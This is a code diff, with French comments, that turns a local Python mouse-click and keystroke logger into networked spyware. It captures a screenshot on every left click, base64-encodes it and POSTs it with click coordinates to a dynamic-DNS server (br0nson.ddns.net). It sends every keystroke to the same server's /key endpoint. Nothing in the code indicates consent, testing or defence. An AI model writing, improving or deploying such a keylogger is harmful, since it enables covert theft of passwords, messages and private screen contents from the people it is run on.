@@ -4,19 +4,15 @@ import time
 from PIL import ImageGrab
 import os
 from datetime import datetime
-from pynput import keyboard
 import requests
 import json
-from datetime import datetime
 import base64
+import io  # Import nécessaire pour BytesIO
+from pynput import keyboard
 
 SERVER_URL = "http://br0nson.ddns.net:5000/upload"
 
 def get_mouse_click_positions():
-    # Créer le dossier 'captures' s'il n'existe pas
-    if not os.path.exists('captures'):
-        os.makedirs('captures')
-
     try:
         while True:
             # Vérifie l'état des boutons de la souris
@@ -31,34 +27,73 @@ def get_mouse_click_positions():
                 # Prendre une capture d'écran
                 screenshot = ImageGrab.grab()
 
-                # Créer un nom de fichier unique basé sur le timestamp
-                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
-                filename = f'screenshot_{timestamp}.png'
+                # Encoder l'image en base64
+                buffered = io.BytesIO()
+                screenshot.save(buffered, format="PNG")
+                img_base64 = base64.b64encode(buffered.getvalue()).decode("utf-8")
 
-                # Chemin complet du fichier dans le dossier 'captures'
-                filepath = os.path.join('captures', filename)
+                # Préparer les données à envoyer en JSON
+                data = {
+                    "click_type": "left_click",
+                    "position": {"x": x, "y": y},
+                    "timestamp": datetime.now().isoformat(),
+                    "screenshot": img_base64
+                }
 
-                # Enregistrer la capture d'écran
-                screenshot.save(filepath)
-                print(f'Capture d\'écran enregistrée sous {filepath}')
+                # Envoyer la requête POST avec les données en JSON
+                try:
+                    response = requests.post(SERVER_URL, json=data)
+                    print(f"Serveur réponse : {response.status_code}")
+                except requests.exceptions.RequestException as e:
+                    print(f"Erreur d'envoi au serveur : {e}")
 
                 # Attend que le bouton soit relâché
                 while win32api.GetKeyState(win32con.VK_LBUTTON) < 0:
                     time.sleep(0.01)
 
-            if state_right < 0:
+            elif state_right < 0:
                 x, y = win32api.GetCursorPos()
                 print('\nClic droit en position ({}, {})'.format(x, y))
-                # Vous pouvez également prendre une capture d'écran ici si vous le souhaitez
 
+                # Préparer les données à envoyer en JSON
+                data = {
+                    "click_type": "right_click",
+                    "position": {"x": x, "y": y},
+                    "timestamp": datetime.now().isoformat(),
+                    "screenshot": None  # Pas de capture d'écran pour le clic droit
+                }
+
+                # Envoyer la requête POST avec les données en JSON
+                try:
+                    response = requests.post(SERVER_URL, json=data)
+                    print(f"Serveur réponse : {response.status_code}")
+                except requests.exceptions.RequestException as e:
+                    print(f"Erreur d'envoi au serveur : {e}")
+
+                # Attend que le bouton soit relâché
                 while win32api.GetKeyState(win32con.VK_RBUTTON) < 0:
                     time.sleep(0.01)
 
-            if state_middle < 0:
+            elif state_middle < 0:
                 x, y = win32api.GetCursorPos()
                 print('\nClic milieu en position ({}, {})'.format(x, y))
-                # Vous pouvez également prendre une capture d'écran ici si vous le souhaitez
 
+                # Préparer les données à envoyer en JSON
+                data = {
+                    "click_type": "middle_click",
+                    "position": {"x": x, "y": y},
+                    "timestamp": datetime.now().isoformat(),
+                    "screenshot": None  # Pas de capture d'écran pour le clic milieu
+                }
+
+                # Envoyer la requête POST avec les données en JSON
+                try:
+                    response = requests.post(SERVER_URL, json=data)
+                    print(f"Serveur réponse : {response.status_code}")
+                except requests.exceptions.RequestException as e:
+                    print(f"Erreur d'envoi au serveur : {e}")
+
+                # Attend que le bouton soit relâché
                 while win32api.GetKeyState(win32con.VK_MBUTTON) < 0:
                     time.sleep(0.01)
 
@@ -67,22 +102,34 @@ def get_mouse_click_positions():
         print("\nProgramme arrêté.")
 
 def keyPressed(key):
-    with open("keyfile.txt", 'a') as logKey:
+    try:
+        char = key.char  # Essaie d'obtenir le caractère
+        print(char, end='', flush=True)
+        # Préparer les données à envoyer
+        data = {
+            "key": char,
+            "timestamp": datetime.now().isoformat()
+        }
+        # Envoyer la requête POST au serveur
         try:
-            char = key.char  # Essaie d'obtenir le caractère
-            print(char, end='', flush=True)
-            logKey.write(char)
-        except AttributeError:
-            # Gère les touches spéciales
-            if key == keyboard.Key.space:
-                print(' ', end='', flush=True)
-                logKey.write(' ')
-            elif key == keyboard.Key.enter:
-                print('\n', end='', flush=True)
-                logKey.write('\n')
-            else:
-                # Vous pouvez ajouter d'autres touches spéciales si nécessaire
-                pass
+            response = requests.post(SERVER_URL + "/key", json=data)
+            print(f"Serveur réponse (key) : {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Erreur d'envoi au serveur (key) : {e}")
+    except AttributeError:
+        # Gère les touches spéciales
+        special_key = str(key)
+        print(special_key, end='', flush=True)
+        data = {
+            "key": special_key,
+            "timestamp": datetime.now().isoformat()
+        }
+        # Envoyer la requête POST au serveur
+        try:
+            response = requests.post(SERVER_URL + "/key", json=data)
+            print(f"Serveur réponse (key) : {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Erreur d'envoi au serveur (key) : {e}")
 
 if __name__ == "__main__":
     # Démarrer le listener du clavier
